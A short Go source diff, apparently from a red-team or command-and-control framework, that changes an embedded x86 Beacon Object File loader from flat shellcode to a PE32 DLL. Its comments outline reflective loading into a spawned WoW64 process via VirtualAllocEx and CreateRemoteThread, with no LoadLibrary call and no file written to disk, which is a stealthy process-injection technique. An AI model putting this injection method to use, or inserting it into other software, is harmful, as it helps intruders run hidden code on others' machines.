@@ -4,20 +4,24 @@ package bof
 
 import _ "embed"
 
-//go:embed internal/x86loader/bof_x86_loader.x86.bin
-var x86LoaderShellcode []byte
+//go:embed internal/x86loader/bof_x86_loader.x86.dll
+var x86LoaderDLL []byte
 
-// loadX86LoaderShellcode returns the embedded x86 BOF loader as a
-// flat PIC shellcode blob. Linked into the binary by the
-// `bof_x86_loader` build tag. The orchestrator
-// (x86fork_windows.go) writes these bytes into a VirtualAllocEx
-// region in a freshly-spawned WoW64 host, then CreateRemoteThread
-// targets offset 0 of the region — no LoadLibrary, no disk drop.
+// loadX86LoaderShellcode returns the embedded x86 BOF loader DLL.
+// Linked into the binary by the `bof_x86_loader` build tag. The
+// orchestrator (x86fork_windows.go) manually reflective-loads the
+// DLL into a freshly-spawned WoW64 host: parses the PE header,
+// VirtualAllocEx's the image, copies each section, applies the
+// .reloc table against the new base address, then
+// CreateRemoteThread targets the BOFExec export. No
+// LoadLibrary, no disk drop.
 //
-// The artefact is produced by scripts/build-bof-x86-loader.sh; the
-// committed .bin is the source of truth so `go build` works
+// The artefact is produced by scripts/build-bof-x86-loader.sh;
+// the committed .dll is the source of truth so `go build` works
 // without any C toolchain (same pattern as
-// runtime/pe/internal/noconsolation/NoConsolation.x64.o).
+// runtime/pe/internal/noconsolation/NoConsolation.x64.o). The
+// "Shellcode" suffix in the function name is a historical
+// remainder — the bytes are PE32, not flat shellcode.
 func loadX86LoaderShellcode() ([]byte, error) {
-	return x86LoaderShellcode, nil
+	return x86LoaderDLL, nil
 }
